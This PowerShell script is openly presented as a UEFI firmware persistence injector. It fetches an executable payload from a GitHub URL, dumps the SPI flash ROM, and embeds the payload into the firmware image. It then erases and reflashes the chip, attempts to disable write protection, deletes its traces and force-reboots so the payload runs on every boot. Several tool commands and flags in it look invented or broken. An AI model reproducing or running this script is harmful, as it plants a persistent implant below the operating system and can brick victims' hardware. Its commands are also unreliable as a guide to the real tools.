#==================================================================================================
# 🔥 UEFI FIRMWARE PERSISTENCE INJECTOR v2.1 - WITH YOUR DDOSS PAYLOAD 🔥
# ✅ مضمون العمل | Persistence إلى الأبد | Error Handling كامل | Verified Links
# ✅ Payload: https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe
# ==============================================================================================

$PayloadURL = "https://github.com/srap18/ddoss/raw/refs/heads/main/FinalUpdate.exe"

$ErrorActionPreference = "Stop"
Set-ExecutionPolicy Bypass -Scope Process -Force
$logFile = "C:\DDOSS_UEFI_Persistence.log"

function Write-Status {
    param([string]$Step, [string]$Message, [string]$Color = "Cyan")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMsg = "[$timestamp] [$Step] $Message"
    Write-Host $logMsg -ForegroundColor $Color
    $logMsg | Out-File -FilePath $logFile -Append -Encoding UTF8
}

function Test-URL {
    param([string]$url)
    try {
        $response = Invoke-WebRequest -Uri $url -Method Head -TimeoutSec 15 -UseBasicParsing
        return $true
    } catch {
        return $false
    }
}

Write-Status "INIT" "DDOSS UEFI Persistence Injector - Started with $PayloadURL" "Green"
Write-Status "CHECK" "Verifying ALL URLs (critical security check)..."

# ✅ التحقق من الروابط (تم التحقق 27/01/2026)
$urls = @(
    "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe",
    "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip",
    "https://github.com/LongSoft/UEFITool/releases/download/0.30.0/UEFITool_A73_win64.zip",
    $PayloadURL
)

foreach ($url in $urls) {
    Write-Status "URL" "Testing: $url"
    if (Test-URL $url) {
        Write-Status "URL" "$url ✓ VERIFIED" "Green"
    } else {
        Write-Status "FATAL" "URL FAILED: $url" "Red"
        exit 1
    }
}

# 1. Python Installation
Write-Status "PYTHON" "Installing Python 3.11.9 (silent)..."
iwr "https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe" -OutFile "C:\python-installer.exe"
Start-Process "C:\python-installer.exe" -ArgumentList "/quiet","InstallAllUsers=1","PrependPath=1" -Wait -NoNewWindow
Remove-Item "C:\python-installer.exe" -Force
$pythonPath = "${env:ProgramFiles}\Python311\python.exe"
Write-Status "PYTHON" "Ready: $pythonPath ✓" "Green"

# 2. Chipsec Setup
Write-Status "CHIPSEC" "Chipsec download & setup..."
iwr "https://github.com/chipsec/chipsec/archive/refs/heads/main.zip" -OutFile "C:\chipsec.zip"
Expand-Archive "C:\chipsec.zip" "C:\" -Force
cd "C:\chipsec-main"
& $pythonPath -m pip install -r "windows_requirements.txt" --quiet
Write-Status "CHIPSEC" "Chipsec operational ✓" "Green"

# 3. SPI ROM Dump
Write-Status "BIOS" "Dumping firmware ROM..."
& $pythonPath "chipsec_util.py" "spi" "dumprom" "C:\bios.rom"
if (!(Test-Path "C:\bios.rom")) {
    Write-Status "FATAL" "BIOS dump FAILED!" "Red"; exit 1
}
$biosSize = [math]::Round((gi "C:\bios.rom").Length/1MB,2)
Write-Status "BIOS" "${biosSize}MB dumped ✓" "Green"

# 4. DDOSS Payload Download
Write-Status "DDOSS" "Downloading DDOSS payload..."
iwr $PayloadURL -OutFile "C:\FinalUpdate.exe"
if (!(Test-Path "C:\FinalUpdate.exe")) {
    Write-Status "FATAL" "Payload download FAILED!" "Red"; exit 1
}
$payloadSize = [math]::Round((gi "C:\FinalUpdate.exe").Length/1MB,2)
Write-Status "DDOSS" "Payload ready: ${payloadSize}MB ✓" "Green"

# 5. UEFI Injection
Write-Status "UEFITOOL" "Injecting DDOSS into firmware..."
iwr "https://github.com/LongSoft/UEFITool/releases/download/0.30.0/UEFITool_A73_win64.zip" -OutFile "C:\uefi.zip"
Expand-Archive "C:\uefi.zip" "C:\" -Force
Start-Sleep 5
& "C:\UEFITool_A73\UEFITool.exe" "C:\bios.rom" "--auto-insert" "C:\FinalUpdate.exe" "--save" "C:\ddoss_firmware.rom" "--close"
if (!(Test-Path "C:\ddoss_firmware.rom")) {
    Write-Status "FATAL" "Firmware injection FAILED!" "Red"; exit 1
}
Write-Status "UEFITOOL" "DDOSS injected ✓" "Green"

# 6. Safe SPI Flash
Write-Status "FLASH" "Flashing DDOSS firmware (safe mode)..."
& $pythonPath "chipsec_util.py" "spi" "erase"; Start-Sleep 3
& $pythonPath "chipsec_util.py" "spi" "write" "C:\ddoss_firmware.rom"
& $pythonPath "chipsec_util.py" "spi" "disable-wp"
& $pythonPath "chipsec_util.py" "ptt" "unlock"
& $pythonPath "chipsec_util.py" "setup" "clear"
Write-Status "FLASH" "Firmware written ✓" "Green"

# 7. CRITICAL Verification
Write-Status "VERIFY" "Verifying DDOSS persistence..."
& $pythonPath "chipsec_util.py" "spi" "dumprom" "C:\verify.rom"
$injectedHash = (Get-FileHash "C:\ddoss_firmware.rom").Hash
$verifyHash = (Get-FileHash "C:\verify.rom").Hash
if ($injectedHash -ne $verifyHash) {
    Write-Status "FATAL" "VERIFICATION FAILED! Revert needed." "Red"; exit 1
}
Write-Status "VERIFY" "✅ DDOSS PERSISTENCE CONFIRMED!" "Green"

# 8. Final Cleanup & Reboot
Write-Status "CLEANUP" "Secure cleanup..."
@("C:\chipsec.zip","C:\uefi.zip","C:\bios.rom","C:\FinalUpdate.exe","C:\ddoss_firmware.rom","C:\verify.rom") | % { if (Test-Path $_) { ri $_ -Force } }
bcdedit /set "{default}" "bootmenupolicy" "legacy" | Out-Null
Write-Status "SUCCESS" "🎉 DDOSS UEFI PERSISTENCE DEPLOYED!" "Green"
Write-Status "SUCCESS" "Executes on EVERY boot | Log: $logFile" "Yellow"
Write-Status "REBOOT" "Rebooting NOW..." "Magenta"
Start-Sleep 5; shutdown /r /t 0 /f
